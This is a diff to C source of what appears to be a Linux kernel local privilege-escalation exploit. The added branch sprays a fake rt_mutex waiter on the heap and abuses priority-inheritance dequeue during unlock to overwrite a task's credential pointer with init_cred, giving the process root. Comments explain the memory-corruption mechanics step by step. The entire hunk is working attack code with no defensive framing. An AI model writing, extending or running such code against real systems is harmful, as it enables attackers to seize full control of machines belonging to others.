@@ -2555,7 +2555,39 @@ uid0_cred_punch:;
           (env_flag("UID0_COMM_CANARY", 0) ? 0x790 : cred_off);
       /* ORACLE-CAPS owns both walks (oracle read + capstore) — the
        * default punch would waste walk-1 on the known-dead 0x780. */
-      if (!env_flag("UID0_ORACLE_CAPS", 0))
+      if (env_flag("UID0_JC2", 0)) {
+        /*
+         * JoinChang upstream mode-2 exact (09-12 repo read): write via
+         * the SPRAYED W0 heap waiter, ghost stamp = benign carrier
+         * (fops.c MODE4_JC2). W0.pi = {pc=slot-8, right=REAL
+         * init_cred, left=0} (util.c pselect_custom_write==2). The
+         * unlock's rt_mutex_dequeue_pi(current, W0) erase does
+         * store-2: *slot = init_cred; store-1 only corrupts
+         * init_cred.usage (huge refcount — never freed). Child then
+         * reads getuid()==0 directly (no setuid dependency).
+         */
+        setenv("MODE4_JC2", "1", 1);
+        g_cred_copy = 0; /* value = REAL init_cred, not the copy */
+        if (!page_base || !fake_w0 || !fake_lock) {
+          page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+          pr_info("JC2 spray: base=%016zx lock=%016zx\n",
+                  page_base, fake_lock);
+          if (!page_base) {
+            pr_error("JC2 spray failed\n");
+            live_sync_log("UID0", "jc2_spray_fail");
+          }
+        }
+        pr_info("UID0 JC2 punch: W0.pi pc=%016zx right=init_cred "
+                "-> *(task+0x780); ghost benign, prio=0, pi_waiters=0\n",
+                (size_t)(use_task + TASK_CRED_OFF - 8));
+        live_sync_log("UID0", "jc2_punch");
+        durable_stage("uid0_jc2_punch");
+        pselect_child_node = 1;
+        set_pselect_write_mode(use_task + TASK_CRED_OFF, 0, 2);
+        run_main_route_threads();
+        clear_pselect_write();
+        unsetenv("MODE4_JC2");
+      } else if (!env_flag("UID0_ORACLE_CAPS", 0))
         uid0_one_store(slot, env_flag("UID0_COMM_CANARY", 0)
                               ? "child_comm_canary"
                               : (self ? "self_cred" : "child_cred"));
